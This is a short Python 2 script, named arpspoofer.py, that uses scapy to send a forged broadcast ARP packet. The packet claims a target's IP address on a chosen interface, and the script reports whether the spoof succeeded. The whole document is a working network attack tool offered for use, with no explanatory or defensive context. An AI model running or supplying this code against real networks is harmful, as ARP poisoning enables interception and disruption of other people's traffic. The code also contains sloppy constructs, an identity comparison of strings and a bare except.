#!/usr/bin/env python
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
try:
	interface = str(sys.argv[1])
	host = str(sys.argv[2])
	target = str(sys.argv[3])
	if interface is "" or host is "" or target is "":
		print "Usage : ./arpspoofer.py <interface> <host> <target>"
	else:
		interface = str(sys.argv[1])
		host = str(sys.argv[2])
		target = str(sys.argv[3])
		rep = srp1(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=host, hwdst="FF:FF:FF:FF:FF:FF", psrc=target), iface=interface, verbose=0, timeout=1)
		if rep:
			print "Spoofed Success"
		else:
			print "Spoofed Failed"
except:
	print "Usage : ./arpspoofer.py <interface> <host> <target>"
